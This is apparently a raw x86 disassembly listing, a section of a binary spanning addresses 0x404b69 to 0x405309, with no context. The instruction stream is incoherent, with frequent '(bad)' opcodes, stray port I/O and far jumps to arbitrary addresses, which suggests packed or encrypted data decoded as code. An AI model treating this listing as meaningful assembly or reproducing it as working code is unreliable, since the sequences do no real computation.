  404b69:	pop    edx
  404b6a:	or     DWORD PTR [ebx],esp
  404b6c:	ins    DWORD PTR es:[edi],dx
  404b6d:	dec    ecx
  404b6e:	pop    ebx
  404b6f:	test   BYTE PTR [esi-0x4a],ch
  404b72:	(bad)  
  404b73:	addr16 mov bh,0x93
  404b76:	xchg   DWORD PTR [eax-0x2a],ebp
  404b79:	lahf   
  404b7a:	xchg   DWORD PTR [eax-0x42744429],eax
  404b80:	(bad)  
  404b81:	jmp    0xd351d205
  404b86:	out    dx,eax
  404b87:	(bad)  
  404b88:	clc    
  404b89:	ja     0x404bec
  404b8b:	lea    edi,[eax]
  404b8d:	inc    eax
  404b8e:	jbe    0x404b5f
  404b90:	(bad)  
  404b91:	xchg   ebx,eax
  404b92:	ret    
  404b93:	es int3 
  404b95:	fbstp  TBYTE PTR [ebx-0xbadf699]
  404b9b:	sbb    DWORD PTR [ebx+0x78],esi
  404b9e:	imul   edx,esi,0x2489a136
  404ba4:	inc    edi
  404ba5:	scas   eax,DWORD PTR es:[edi]
  404ba6:	sub    esp,DWORD PTR [eax]
  404ba8:	inc    ebp
  404ba9:	test   DWORD PTR [esi],esi
  404bab:	mov    al,ds:0x1aa330c8
  404bb0:	ja     0x404ba0
  404bb2:	scas   eax,DWORD PTR es:[edi]
  404bb3:	(bad)  
  404bb4:	and    al,0x5
  404bb6:	lods   eax,DWORD PTR ds:[esi]
  404bb7:	xchg   edi,eax
  404bb8:	out    dx,al
  404bb9:	mov    dl,BYTE PTR [edx+edx*1+0x5bbf52b0]
  404bc0:	bound  ebx,QWORD PTR [ecx+0x3ecb00b2]
  404bc6:	or     eax,0xc3b00461
  404bcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bcc:	enter  0x12b9,0xba
  404bd0:	inc    esi
  404bd1:	dec    esp
  404bd2:	dec    eax
  404bd3:	dec    edx
  404bd4:	sbb    BYTE PTR [edi],dl
  404bd6:	xchg   esp,eax
  404bd7:	rcr    bh,cl
  404bd9:	jae    0x404b7c
  404bdb:	xchg   edx,eax
  404bdc:	push   ds
  404bdd:	inc    esi
  404bde:	xor    al,0xa9
  404be0:	cmp    ch,BYTE PTR [esi]
  404be2:	mov    dh,0x64
  404be4:	rcl    BYTE PTR [ebx-0x6b],cl
  404be7:	jo     0x404b9e
  404be9:	mov    bl,0x7d
  404beb:	ret    0xeb1a
  404bee:	mov    dh,0x4c
  404bf0:	mov    esp,0x6b926914
  404bf5:	sbb    DWORD PTR [ebp-0x55],ebp
  404bf8:	sub    BYTE PTR ds:[esp+eax*4],ah
  404bfc:	ds (bad) 
  404bfe:	stos   DWORD PTR es:[edi],eax
  404bff:	repz cdq 
  404c01:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  404c03:	sti    
  404c04:	stc    
  404c05:	xor    eax,ebx
  404c07:	push   ecx
  404c08:	loope  0x404bd1
  404c0a:	sbb    BYTE PTR [ebx+0x74fadd7d],bl
  404c10:	mov    es,WORD PTR [ecx+0x17]
  404c13:	jmp    0x1ceb:0x43cb3523
  404c1a:	inc    esp
  404c1b:	adc    DWORD PTR [ebx-0x80],esi
  404c1e:	cmp    DWORD PTR [edx+0x45e656c6],edi
  404c24:	std    
  404c25:	or     eax,0x24d9b6e0
  404c2a:	xor    BYTE PTR ds:0x6d4ce2da,bh
  404c30:	sbb    esp,DWORD PTR [edi]
  404c32:	retf   0x73f3
  404c35:	or     ebp,DWORD PTR [edx+0x48c24458]
  404c3b:	mov    esi,0x7b30d88a
  404c40:	inc    ebx
  404c41:	jns    0x404c2b
  404c43:	fwait
  404c44:	pcmpeqw mm6,QWORD PTR [edi-0x64a1ac80]
  404c4b:	adc    edx,0xea2c121
  404c51:	(bad)  
  404c52:	fidiv  DWORD PTR [esi-0x2800dd51]
  404c59:	push   0xffffffed
  404c5b:	mov    esp,0xfe273cdf
  404c60:	ret    
  404c61:	jo     0x404c11
  404c63:	push   ebp
  404c64:	call   0xbd6d6fc6
  404c69:	sahf   
  404c6a:	hlt    
  404c6b:	ins    BYTE PTR es:[edi],dx
  404c6c:	outs   dx,DWORD PTR ds:[esi]
  404c6d:	call   0xb07f632a
  404c72:	in     al,0x5f
  404c74:	pop    ebp
  404c75:	shr    DWORD PTR [eax+esi*2+0x5286fea6],1
  404c7c:	add    BYTE PTR [ebx+0x3d],bl
  404c7f:	inc    edi
  404c80:	sbb    eax,0x12e2f65e
  404c85:	sahf   
  404c86:	push   ecx
  404c87:	push   esp
  404c88:	lds    edx,FWORD PTR [ebx+0x3e]
  404c8b:	and    al,0xbe
  404c8d:	enter  0xfca7,0xb1
  404c91:	cmp    bh,bl
  404c93:	inc    edi
  404c94:	xor    DWORD PTR [edi-0x32648b0],esp
  404c9a:	sahf   
  404c9b:	xchg   ecx,eax
  404c9c:	sbb    DWORD PTR [esi],esp
  404c9e:	cmp    eax,0x40f57e4
  404ca3:	neg    DWORD PTR [edi+0x1b35ce4a]
  404ca9:	mov    al,0x6a
  404cab:	(bad)  
  404cac:	sbb    bh,BYTE PTR [esi]
  404cae:	push   ss
  404caf:	add    eax,0x1d6a6757
  404cb4:	retf   0xcc58
  404cb7:	not    DWORD PTR [ebp-0x9d9f371]
  404cbd:	jmp    0x32a4211c
  404cc2:	sub    dl,cl
  404cc4:	inc    ebp
  404cc5:	xor    BYTE PTR [ecx+0x5ffc34cd],bh
  404ccb:	push   0x26
  404ccd:	xchg   edi,eax
  404cce:	mov    cl,0x90
  404cd0:	fmul   QWORD PTR [esi+ecx*1-0x11bdcf6c]
  404cd7:	stos   BYTE PTR es:[edi],al
  404cd8:	test   esi,ebp
  404cda:	inc    ecx
  404cdb:	addr16 mov dl,0xbc
  404cde:	clc    
  404cdf:	in     al,dx
  404ce0:	stos   BYTE PTR es:[edi],al
  404ce1:	and    eax,DWORD PTR [eax+0x304fd7b5]
  404ce7:	push   0x20
  404ce9:	(bad)  
  404cea:	push   eax
  404ceb:	add    eax,0x5241f622
  404cf0:	xor    ecx,DWORD PTR [ebx+0x10]
  404cf3:	js     0x404c76
  404cf5:	lahf   
  404cf6:	out    dx,eax
  404cf7:	pop    ds
  404cf8:	nop
  404cf9:	adc    al,0x9e
  404cfb:	int    0xd
  404cfd:	sbb    ebp,DWORD PTR [edx]
  404cff:	mov    bh,0x4c
  404d01:	mov    cl,0x9b
  404d03:	xlat   BYTE PTR cs:[ebx]
  404d05:	adc    eax,DWORD PTR ds:0xa409c069
  404d0b:	sub    DWORD PTR [edx+0x5c],edx
  404d0e:	rcr    edi,1
  404d10:	rcl    DWORD PTR [ebp-0x23],0xd3
  404d14:	call   0x79377dbc
  404d19:	aam    0x46
  404d1b:	push   0x23
  404d1d:	fisubr WORD PTR [ebp-0x6a]
  404d20:	and    ebp,DWORD PTR [esi+eax*2+0x1a]
  404d24:	das    
  404d25:	jl     0x404d61
  404d27:	xor    al,0x1d
  404d29:	jb     0x404d23
  404d2b:	pop    ebp
  404d2d:	hlt    
  404d2e:	mov    ecx,DWORD PTR ds:0x9b5cc465
  404d34:	or     ch,BYTE PTR [esi]
  404d36:	sahf   
  404d37:	adc    ch,BYTE PTR [ebx+edi*1+0x53]
  404d3b:	xchg   esi,eax
  404d3c:	xor    edx,ebx
  404d3e:	mov    ch,0xc5
  404d40:	push   edi
  404d41:	daa    
  404d42:	adc    al,0x2
  404d44:	add    ebp,DWORD PTR [eax+eiz*4]
  404d47:	int    0xaf
  404d49:	mov    al,0xf2
  404d4b:	mov    DWORD PTR [ebp+0x5f472975],0x1cda56ae
  404d55:	jno    0x404d8c
  404d57:	dec    esp
  404d58:	jl     0x404cf4
  404d5a:	xchg   esi,eax
  404d5b:	mov    BYTE PTR [ecx+0x71],bl
  404d5e:	in     al,0x31
  404d60:	and    BYTE PTR [ecx],ah
  404d62:	dec    ebp
  404d63:	cli    
  404d64:	push   ebx
  404d65:	cld    
  404d66:	(bad)  
  404d67:	mov    esp,0x10060e5d
  404d6c:	nop
  404d6d:	sahf   
  404d6e:	int    0x9b
  404d70:	push   eax
  404d71:	jno    0x404d39
  404d73:	sahf   
  404d74:	xlat   BYTE PTR ds:[ebx]
  404d75:	dec    esp
  404d76:	stos   DWORD PTR es:[edi],eax
  404d77:	dec    ecx
  404d78:	push   eax
  404d79:	xor    BYTE PTR [ecx-0x54],cl
  404d7c:	jge    0x404d4e
  404d7e:	lds    edx,FWORD PTR [ecx+0xb]
  404d81:	loopne 0x404dcd
  404d83:	call   0x6ad506ba
  404d88:	retf   0xfa23
  404d8b:	pop    ss
  404d8c:	xchg   esp,eax
  404d8d:	stos   BYTE PTR es:[edi],al
  404d8e:	ret    
  404d8f:	fcomp  QWORD PTR [ebx-0x2e29404d]
  404d95:	dec    edx
  404d96:	stc    
  404d97:	xchg   DWORD PTR [ebp-0x65],esp
  404d9a:	jle    0x404da6
  404d9c:	repz sti 
  404d9e:	and    ah,dh
  404da0:	jo     0x404da2
  404da2:	(bad)  
  404da3:	int3   
  404da4:	mov    ebp,0x99edc53e
  404da9:	cmp    eax,0xd8615dd8
  404dae:	adc    BYTE PTR ds:0xff713ee2,dh
  404db4:	add    esi,DWORD PTR [ebp-0x35]
  404db7:	ret    
  404db8:	bnd ret 0x7c05
  404dbc:	lock jge 0x404d6f
  404dbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dc0:	add    eax,0xa69f41ba
  404dc5:	scas   eax,DWORD PTR es:[edi]
  404dc6:	sub    DWORD PTR [ecx],ebx
  404dc8:	mov    edi,0x5ca0fc43
  404dcd:	pop    edi
  404dce:	cwde   
  404dcf:	inc    ebx
  404dd0:	mov    eax,ds
  404dd2:	and    DWORD PTR [esi],edx
  404dd4:	jp     0x404e08
  404dd6:	add    eax,DWORD PTR [eax+eiz*4-0x71f19341]
  404ddd:	sbb    DWORD PTR [esi-0x726867f0],0x81d81031
  404de7:	inc    edx
  404de8:	bound  esp,QWORD PTR [ebx+0x39]
  404deb:	pop    ds
  404dec:	push   0xc0ce2e5c
  404df1:	and    al,0x6b
  404df3:	sti    
  404df4:	fadd   DWORD PTR ds:0x46d8d037
  404dfa:	push   eax
  404dfb:	call   0x7a1c:0x5417ae30
  404e02:	push   edx
  404e03:	dec    esi
  404e04:	and    bh,BYTE PTR [eax-0x553b5e3]
  404e0a:	push   ecx
  404e0b:	(bad)  
  404e0c:	(bad)  
  404e0e:	mov    esp,0x52ef4f92
  404e13:	test   BYTE PTR [esi-0x3ee08ff4],ah
  404e19:	or     edx,ebp
  404e1b:	add    eax,0x8563ce35
  404e20:	sub    DWORD PTR [esi],edi
  404e22:	sbb    BYTE PTR [edx+0x678a6160],bh
  404e28:	dec    ecx
  404e29:	pop    eax
  404e2a:	imul   eax,esi,0xffffffc8
  404e2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e2e:	mov    cl,0xb0
  404e30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e31:	inc    ecx
  404e32:	mov    dl,0xff
  404e34:	sbb    dl,0xa3
  404e37:	cmp    ch,BYTE PTR [eax]
  404e39:	outs   dx,DWORD PTR ds:[esi]
  404e3a:	lds    edi,FWORD PTR [edi+0x4a]
  404e3d:	cmp    eax,0x88087f6d
  404e42:	jecxz  0x404e03
  404e44:	fwait
  404e45:	push   esp
  404e46:	dec    edx
  404e47:	sub    al,0x35
  404e49:	int3   
  404e4a:	xor    esi,DWORD PTR ds:0xd5eb2c76
  404e50:	jno    0x404ebc
  404e52:	sbb    DWORD PTR [edi],0x9889e4e6
  404e58:	out    dx,eax
  404e59:	cmp    BYTE PTR [esp+edx*4-0x7],bl
  404e5d:	jno    0x404ed3
  404e5f:	pop    ds
  404e60:	daa    
  404e61:	push   ss
  404e62:	xchg   BYTE PTR [ecx+ebp*2-0x36],bh
  404e66:	retf   0xe2e5
  404e69:	push   0xffffffef
  404e6b:	ror    DWORD PTR es:[ebx-0x54],0xbc
  404e70:	mov    dh,0x20
  404e72:	ds jl  0x404ea4
  404e75:	add    eax,0x572cb535
  404e7a:	fwait
  404e7b:	test   eax,0x1d6909ae
  404e80:	add    BYTE PTR [eax-0x5e4111d1],dl
  404e86:	outs   dx,DWORD PTR ds:[esi]
  404e87:	xchg   ebp,eax
  404e88:	lock or BYTE PTR [edx-0x66],ch
  404e8c:	xor    BYTE PTR [ecx+eiz*2-0x16],cl
  404e90:	test   DWORD PTR [ebx+0x17],edi
  404e93:	xor    ebx,DWORD PTR [ebx+0x6f]
  404e96:	addr16 push ecx
  404e98:	rcr    DWORD PTR [ebx+0x75],cl
  404e9b:	lods   al,BYTE PTR ds:[esi]
  404e9c:	mov    ah,0x7c
  404e9e:	add    eax,0xbdba830f
  404ea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ea4:	mov    ebx,0x9a157f90
  404ea9:	sbb    BYTE PTR [edi-0x3b],ch
  404eac:	lock cli 
  404eae:	loop   0x404f10
  404eb0:	in     eax,dx
  404eb1:	add    eax,0xbb6a42c
  404eb7:	or     ebx,edx
  404eb9:	popf   
  404eba:	ins    BYTE PTR es:[edi],dx
  404ebb:	or     eax,0xbf66ecaa
  404ec0:	lock sub al,0x93
  404ec3:	pusha  
  404ec4:	and    ebp,esp
  404ec6:	cmp    eax,0x5092849f
  404ecb:	scas   eax,DWORD PTR es:[edi]
  404ecc:	out    0x5c,eax
  404ece:	and    BYTE PTR [edi+0x62],bh
  404ed1:	mov    ecx,0xfb6a9541
  404ed6:	adc    al,0x67
  404ed8:	int3   
  404ed9:	fisttp WORD PTR [edx]
  404edb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404edc:	ins    BYTE PTR es:[edi],dx
  404edd:	shr    DWORD PTR [edx+0x1b],cl
  404ee0:	sbb    cl,ah
  404ee2:	(bad)  
  404ee3:	icebp  
  404ee4:	cld    
  404ee5:	mov    DWORD PTR [ebx],edi
  404ee7:	sti    
  404ee8:	pop    edi
  404ee9:	push   ebx
  404eea:	sub    edx,esp
  404eec:	add    al,0xb7
  404eee:	ds sub edi,eax
  404ef1:	sbb    edx,DWORD PTR [eax-0x751b5455]
  404ef7:	in     al,0x79
  404ef9:	xor    al,0x13
  404efb:	sub    BYTE PTR [ecx+eiz*1-0x2e],ch
  404eff:	sbb    BYTE PTR [ebp+0x6a],0x72
  404f03:	sbb    al,0x6b
  404f05:	repz pop edi
  404f07:	mov    ah,0xa6
  404f09:	std    
  404f0a:	das    
  404f0b:	fadd   QWORD PTR [esi]
  404f0d:	push   ds
  404f0e:	mov    ds:0x239548f0,eax
  404f13:	inc    edi
  404f14:	das    
  404f15:	mov    esp,0xf73af16e
  404f1a:	push   edx
  404f1b:	adc    DWORD PTR fs:[eax],0x721d6a36
  404f22:	xor    al,0x24
  404f24:	push   0xcfe992c1
  404f29:	fs jno 0x404ef5
  404f2c:	cld    
  404f2d:	dec    esi
  404f2e:	and    BYTE PTR [edi-0x35142625],bh
  404f34:	lods   eax,DWORD PTR ds:[esi]
  404f35:	push   ebx
  404f36:	ja     0x404f08
  404f38:	adc    al,0x43
  404f3a:	mov    bl,0xac
  404f3c:	xchg   esp,eax
  404f3d:	xor    BYTE PTR [ecx],bl
  404f3f:	xchg   bh,cl
  404f41:	cdq    
  404f42:	xlat   BYTE PTR ds:[ebx]
  404f43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f44:	mov    al,BYTE PTR [ebx]
  404f46:	call   0xb1a2:0xfe18774f
  404f4d:	xor    BYTE PTR [ebx+0x2738f56f],dh
  404f53:	xchg   ebx,eax
  404f54:	cwde   
  404f55:	cmp    eax,0x9ac0d010
  404f5a:	push   ebp
  404f5b:	adc    eax,0xc753d0ee
  404f60:	and    BYTE PTR ds:0x70dd1499,bl
  404f66:	call   0xbc63539d
  404f6b:	(bad)  
  404f6c:	adc    DWORD PTR [eax],ebx
  404f6e:	or     DWORD PTR [edx-0x3d],edx
  404f71:	test   bh,ch
  404f73:	data16 scas al,BYTE PTR es:[edi]
  404f75:	sub    BYTE PTR [esi-0x6f],dh
  404f78:	mov    ecx,0x3ce3b58d
  404f7d:	mulps  xmm6,XMMWORD PTR [ecx+0x268d38f3]
  404f84:	lea    edx,[ebp-0x67f11de0]
  404f8a:	adc    eax,0x65eaba68
  404f8f:	aad    0x76
  404f91:	enter  0x9f9b,0x7a
  404f95:	push   ss
  404f96:	leave  
  404f97:	imul   esp,ebp,0x707b5338
  404f9d:	mov    ah,0xf
  404f9f:	xor    eax,0xd7e5860b
  404fa4:	retf   
  404fa5:	int    0xb9
  404fa7:	test   eax,0xcd5c24f5
  404fac:	xlat   BYTE PTR ds:[ebx]
  404fad:	mov    eax,edx
  404faf:	rcr    BYTE PTR [ebx+0x6e7a96b9],cl
  404fb5:	and    al,0xe0
  404fb7:	jb     0x404f98
  404fb9:	mov    ch,dh
  404fbb:	sbb    eax,0x5d08465b
  404fc0:	loopne 0x405005
  404fc2:	jbe    0x404ffb
  404fc4:	jne    0x404ff7
  404fc6:	add    DWORD PTR [edi-0x66],esp
  404fc9:	push   ebp
  404fca:	xchg   ebx,eax
  404fcb:	outs   dx,BYTE PTR ds:[esi]
  404fcc:	scas   eax,DWORD PTR es:[edi]
  404fcd:	xor    ebx,eax
  404fcf:	add    al,0x7f
  404fd1:	adc    esi,eax
  404fd3:	sub    bl,cl
  404fd5:	mov    ss,WORD PTR [edx+edx*2]
  404fd8:	mov    esp,0x7064333
  404fdd:	hlt    
  404fde:	sub    DWORD PTR [ebx-0x67d3a835],esp
  404fe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fe5:	fisubr WORD PTR [edi]
  404fe7:	pop    ds
  404fe8:	aam    0xf0
  404fea:	fwait
  404feb:	shl    DWORD PTR [edx+0x5f],cl
  404fee:	lahf   
  404fef:	in     al,dx
  404ff0:	mov    ah,0x52
  404ff2:	ret    
  404ff3:	sub    eax,0x172d3862
  404ff9:	pop    ebx
  404ffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ffb:	push   eax
  404ffc:	les    esi,FWORD PTR [ecx-0x23375a04]
  405002:	push   edi
  405003:	mov    cl,0x27
  405005:	adc    eax,DWORD PTR [eax+0x5f4700c]
  40500b:	(bad)  
  40500c:	lahf   
  40500d:	jl     0x404fa7
  40500f:	xor    DWORD PTR [edx],esp
  405011:	jl     0x405092
  405013:	and    esp,esi
  405015:	pop    ecx
  405016:	pop    eax
  405017:	xor    BYTE PTR [esi-0x75],dl
  40501a:	sar    cl,0x4a
  40501d:	cmp    al,0xdd
  40501f:	push   edi
  405020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405021:	cmp    al,0xe7
  405023:	jo     0x405040
  405025:	dec    ebp
  405026:	mov    edi,0x7d424f4d
  40502b:	in     eax,dx
  40502c:	jb     0x404fb5
  40502e:	leave  
  40502f:	sbb    eax,0x6ad21784
  405034:	dec    ecx
  405035:	(bad)  
  405036:	les    esp,FWORD PTR [ecx+0x12e5b005]
  40503c:	sar    bl,cl
  40503e:	xor    BYTE PTR [ecx-0x222cfbbf],bl
  405044:	hlt    
  405045:	test   al,0x41
  405047:	push   edi
  405048:	pop    esi
  405049:	es and eax,0x2905c63
  40504f:	dec    ebp
  405050:	sub    eax,0xe62c22e
  405055:	iret   
  405056:	push   bp
  405058:	das    
  405059:	jge    0x405018
  40505b:	imul   esi,edx,0x0
  40505e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40505f:	jnp    0x405071
  405061:	pop    esi
  405062:	inc    eax
  405063:	push   0x19
  405065:	imul   DWORD PTR [ebx+0x7467cf99]
  40506b:	ins    BYTE PTR es:[edi],dx
  40506c:	or     bh,BYTE PTR [esi]
  40506e:	arpl   WORD PTR [eax-0x6b1a9dc4],bp
  405074:	inc    edx
  405075:	es add eax,0x51ddf31c
  40507b:	popf   
  40507c:	xor    eax,0x709325a3
  405081:	cwde   
  405082:	xlat   BYTE PTR ds:[ebx]
  405083:	jae    0x405088
  405085:	pusha  
  405086:	ds adc eax,0xf3ddb25
  40508c:	sbb    eax,0x81958b1d
  405091:	fstp   DWORD PTR [edi+0x3c]
  405094:	adc    ebx,DWORD PTR ds:0xbeb24d4f
  40509a:	mov    dl,BYTE PTR [edi+eiz*4]
  40509d:	pop    eax
  40509e:	inc    ebp
  40509f:	mov    ds:0x135f6fdf,eax
  4050a4:	enter  0xbc11,0xd8
  4050a8:	sbb    edi,DWORD PTR [edi]
  4050aa:	inc    ebp
  4050ab:	jmp    0x2ae0:0xb3c78699
  4050b2:	sub    eax,0x715b0c4d
  4050b7:	lods   al,BYTE PTR ds:[esi]
  4050b8:	or     ch,0xa0
  4050bb:	(bad)  
  4050bc:	dec    edi
  4050bd:	dec    esi
  4050be:	jno    0x4050cb
  4050c0:	or     al,0xea
  4050c2:	je     0x405101
  4050c4:	jg     0x405061
  4050c6:	pusha  
  4050c7:	adc    al,BYTE PTR [ecx-0x6]
  4050ca:	mov    DWORD PTR ss:[esi-0x317cf281],esp
  4050d1:	or     bl,BYTE PTR [eax+0x46]
  4050d4:	mov    ds:0x9974f116,al
  4050d9:	dec    ebx
  4050da:	xchg   edx,eax
  4050db:	pop    ss
  4050dc:	xor    BYTE PTR [bp+di+0x4c],dl
  4050e0:	fld    DWORD PTR [eax+0x4d]
  4050e3:	(bad)  
  4050e4:	sti    
  4050e5:	mov    BYTE PTR [edx-0x68a99f64],dh
  4050eb:	addr16 inc ebx
  4050ed:	adc    al,0x8a
  4050ef:	push   edx
  4050f0:	out    dx,eax
  4050f1:	push   ebx
  4050f2:	mov    eax,ds:0x1c5797da
  4050f7:	fld    QWORD PTR [edx+0x29]
  4050fa:	jne    0x4050f6
  4050fc:	push   es
  4050fd:	shr    DWORD PTR [eax],1
  4050ff:	and    eax,0xeb898e07
  405104:	and    dl,bl
  405106:	in     eax,dx
  405107:	stos   BYTE PTR es:[edi],al
  405108:	mov    dh,0xd0
  40510a:	outs   dx,DWORD PTR ds:[esi]
  40510b:	or     eax,0x1ab437f2
  405110:	test   al,0xca
  405112:	dec    edx
  405113:	jno    0x4050ce
  405115:	cmp    BYTE PTR [eax+0x7c],cl
  405118:	and    eax,0x6fe5d8e7
  40511d:	mov    ah,0x16
  40511f:	test   BYTE PTR [ecx+0x44],0x7c
  405123:	jns    0x4050e5
  405125:	jle    0x405109
  405127:	pop    esp
  405128:	ror    DWORD PTR [esi+0x6be75c07],cl
  40512e:	mov    esp,0xf1a04829
  405133:	and    BYTE PTR [edi],cl
  405135:	out    0x93,eax
  405137:	or     al,0x6e
  405139:	stc    
  40513a:	call   0x3cf03335
  40513f:	pop    ecx
  405140:	jle    0x405106
  405142:	mov    bl,0x1e
  405144:	jle    0x405127
  405146:	push   ecx
  405147:	imul   esi,DWORD PTR ss:[edx+0x61],0x51af3b2f
  40514f:	cld    
  405150:	sbb    DWORD PTR [eax-0x32],edi
  405153:	ror    cl,cl
  405155:	mov    dh,0x73
  405157:	jge    0x405116
  405159:	mov    eax,0xdbcd574c
  40515e:	scas   eax,DWORD PTR es:[edi]
  40515f:	jno    0x405158
  405161:	neg    DWORD PTR [eax-0x71]
  405164:	repz jo 0x405158
  405167:	jno    0x405127
  405169:	aas    
  40516a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40516b:	inc    edx
  40516c:	daa    
  40516d:	sbb    BYTE PTR [edx-0x700704ea],bh
  405173:	inc    esi
  405174:	xchg   DWORD PTR [ebx+0x41],ebp
  405177:	cs inc edi
  405179:	cs (bad) 
  40517b:	fisttp QWORD PTR [edi]
  40517d:	sub    DWORD PTR [ecx],ebx
  40517f:	push   ebp
  405180:	sar    al,cl
  405182:	and    dl,ch
  405184:	push   esi
  405185:	mov    ds:0x269ef9e3,eax
  40518a:	leave  
  40518b:	leave  
  40518c:	aam    0xb
  40518e:	fldenv [ebp-0x5b]
  405191:	jg     0x4051ea
  405193:	jl     0x40516a
  405195:	fistp  DWORD PTR [ecx-0x1d]
  405198:	mov    bl,bl
  40519a:	or     cl,dl
  40519c:	jmp    0x405129
  40519e:	sbb    eax,0x1b611886
  4051a3:	lock das 
  4051a5:	push   0xffffffac
  4051a7:	mov    al,ds:0xc4c5649f
  4051ac:	mov    esp,0x6ba0c22b
  4051b1:	xchg   BYTE PTR [eax],ch
  4051b3:	pop    ebp
  4051b4:	xor    DWORD PTR [eax+eiz*4+0x54],ebp
  4051b8:	ja     0x4051be
  4051ba:	test   BYTE PTR [edx-0xcb434f],0x20
  4051c1:	jp     0x405171
  4051c3:	jnp    0x40515c
  4051c5:	mov    esi,0xd7afdc0f
  4051ca:	icebp  
  4051cb:	pop    ebp
  4051cc:	loope  0x4051da
  4051ce:	add    al,0x37
  4051d0:	daa    
  4051d1:	hlt    
  4051d2:	cli    
  4051d3:	rcl    bh,0x1d
  4051d6:	jecxz  0x405247
  4051d8:	enter  0xc00a,0xdc
  4051dc:	fisub  WORD PTR [edx-0x26bc5cb7]
  4051e2:	outs   dx,BYTE PTR ds:[esi]
  4051e3:	shl    DWORD PTR [eax],1
  4051e5:	stc    
  4051e6:	jg     0x405215
  4051e8:	add    DWORD PTR [edi],edx
  4051ea:	dec    eax
  4051eb:	push   ds
  4051ec:	adc    al,0x8f
  4051ee:	in     al,dx
  4051ef:	sar    BYTE PTR [esi-0x58],cl
  4051f2:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4051f4:	pop    ecx
  4051f5:	cmc    
  4051f6:	mov    ah,0x6f
  4051f8:	xchg   esi,eax
  4051f9:	and    ebx,ebp
  4051fb:	data16 aad 0x8a
  4051fe:	fucompp 
  405200:	cdq    
  405201:	dec    eax
  405202:	push   ebp
  405203:	mov    bl,0x71
  405205:	jb     0x405257
  405207:	icebp  
  405208:	aam    0x4d
  40520a:	xchg   edx,eax
  40520b:	pop    ebx
  40520c:	repnz xchg edx,eax
  40520e:	mov    esp,0x161fd290
  405213:	shl    BYTE PTR [ebp+ebx*1-0x6d2059ce],1
  40521a:	xor    al,0x64
  40521c:	push   eax
  40521d:	dec    edi
  40521e:	popf   
  40521f:	hlt    
  405220:	popw   ss
  405222:	int    0x5d
  405224:	sub    dl,bl
  405226:	pop    ecx
  405227:	test   DWORD PTR ds:0xf7b26bdb,ecx
  40522d:	test   BYTE PTR [ebp+ebp*1-0x7c5b6671],0xeb
  405235:	out    0xdb,eax
  405237:	xlat   BYTE PTR ds:[ebx]
  405239:	xlat   BYTE PTR ds:[ebx]
  40523a:	push   edx
  40523b:	xor    al,0x56
  40523d:	rcr    dl,0xee
  405240:	cwde   
  405241:	jp     0x40522c
  405243:	mov    bl,0xb7
  405245:	pop    edi
  405246:	loopne 0x40525b
  405248:	sub    al,0x7d
  40524b:	dec    edi
  40524c:	daa    
  40524d:	jnp    0x40528b
  40524f:	out    0x76,al
  405251:	mov    cl,0xde
  405253:	dec    edx
  405254:	ret    0x12f7
  405257:	pop    esi
  405258:	push   esi
  405259:	push   eax
  40525a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40525b:	pushf  
  40525c:	or     al,0xb1
  40525e:	sub    eax,0xda82cd79
  405263:	fcomp  DWORD PTR [esi]
  405265:	and    eax,0xabaa8ddd
  40526a:	or     DWORD PTR [eax-0x57],eax
  40526d:	push   edi
  40526e:	mov    bh,0xab
  405270:	adc    DWORD PTR [edx+esi*4],ebx
  405273:	not    DWORD PTR [edx+0x450cddb3]
  405279:	aad    0xf
  40527b:	leave  
  40527c:	ror    DWORD PTR [edx+0x2f],cl
  40527f:	add    DWORD PTR [eax+0x9],ebx
  405282:	add    eax,0x68159e9c
  405287:	cdq    
  405288:	xchg   ebp,eax
  405289:	(bad)  
  40528a:	or     eax,0xb5dbf02c
  40528f:	fistp  WORD PTR [ebx-0x5f]
  405292:	fs cmp eax,0x2159a801
  405298:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405299:	or     ch,0x3c
  40529c:	ret    
  40529d:	ins    DWORD PTR es:[edi],dx
  40529e:	and    al,0x1a
  4052a0:	sar    DWORD PTR [edi],cl
  4052a2:	daa    
  4052a3:	pop    esp
  4052a4:	cld    
  4052a5:	inc    edi
  4052a6:	into   
  4052a7:	ret    0x6e93
  4052aa:	or     al,0x97
  4052ac:	sub    DWORD PTR ds:0x72199cb8,ecx
  4052b2:	mov    eax,0xe1c467ad
  4052b7:	adc    eax,0x4986e1d3
  4052bc:	or     dl,ch
  4052be:	lods   al,BYTE PTR ds:[esi]
  4052bf:	retf   0x6d84
  4052c2:	adc    BYTE PTR [edx-0x6d7edf3c],0x1e
  4052c9:	pop    es
  4052ca:	pop    ebp
  4052cb:	push   esp
  4052cc:	sub    cl,bh
  4052ce:	push   eax
  4052cf:	fwait
  4052d0:	pop    ss
  4052d1:	and    esi,0x5b
  4052d4:	loopne 0x40534c
  4052d6:	mov    ds:0xce561931,eax
  4052db:	jecxz  0x4052d3
  4052dd:	push   edi
  4052de:	in     al,0x22
  4052e0:	xchg   ecx,eax
  4052e1:	xor    al,0x3b
  4052e3:	out    dx,al
  4052e4:	xor    DWORD PTR [eax-0x50],edi
  4052e7:	add    al,0x7d
  4052e9:	out    0x97,eax
  4052eb:	jl     0x4052f1
  4052ed:	ret    0x24a4
  4052f0:	adc    al,BYTE PTR ds:0x228ba1fa
  4052f6:	scas   al,BYTE PTR es:[edi]
  4052f7:	daa    
  4052f8:	xor    DWORD PTR [ecx],edi
  4052fa:	lods   eax,DWORD PTR ds:[esi]
  4052fb:	in     eax,0xf0
  4052fd:	jg     0x405365
  4052ff:	and    eax,0x8ee95499
  405304:	lahf   
  405305:	ins    DWORD PTR es:[edi],dx
  405306:	je     0x40530f
  405308:	ret    
  405309:	mov    cl,0xfb
